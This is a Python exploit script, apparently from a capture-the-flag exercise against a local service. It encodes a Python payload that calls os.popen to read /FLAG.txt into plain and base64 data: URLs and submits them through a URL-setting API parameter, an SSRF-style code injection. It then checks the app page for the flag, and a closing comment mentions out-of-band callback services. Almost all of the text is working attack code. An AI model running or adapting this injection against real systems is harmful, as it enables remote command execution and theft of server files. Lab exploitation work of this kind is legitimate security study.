import requests
import json
import urllib.parse
import base64

target = "http://127.0.0.1:32985"

# New Approach: Use data URLs
# Data URLs encode the content directly in the URL
# format: data:[<mediatype>][;base64],<data>

# Create our malicious JSON
malicious_json = json.dumps({"script": "__import__('os').popen('cat /FLAG.txt').read()"})
print(f"[+] Malicious JSON: {malicious_json}")

# Try data URL with plain text
data_url_plain = f"data:application/json,{urllib.parse.quote(malicious_json)}"
print(f"[+] Data URL (plain): {data_url_plain[:100]}...")

# Try data URL with base64
b64_json = base64.b64encode(malicious_json.encode()).decode()
data_url_b64 = f"data:application/json;base64,{b64_json}"
print(f"[+] Data URL (base64): {data_url_b64[:100]}...")

# Test data URL with target
for name, url in [("plain", data_url_plain), ("base64", data_url_b64)]:
    print(f"\n[+] Testing data URL ({name})...")
    try:
        set_url = f"{target}/api/set?url={urllib.parse.quote(url, safe='')}"  # safe='' to encode everything
        print(f"[+] Set URL: {set_url[:200]}...")
        r = requests.get(set_url, timeout=10)
        print(f"[+] Set response: {r.text}")
        
        r2 = requests.get(f"{target}/app", timeout=10)
        print(f"[+] App status: {r2.status_code}")
        if "FLAG" in r2.text or "flag" in r2.text.lower():
            print(f"[!!!] FLAG FOUND!")
            print(r2.text)
        else:
            print(f"[+] Response: {r2.text[:1500]}")
    except Exception as e:
        print(f"[+] Error: {e}")

# Approach 2: Try using OOB (out-of-band) data services
print("\n[+] Trying OOB services...")

# Try using dnslog.cn or interactsh for blind SSRF first to confirm
# But we need a service that returns controlled JSON

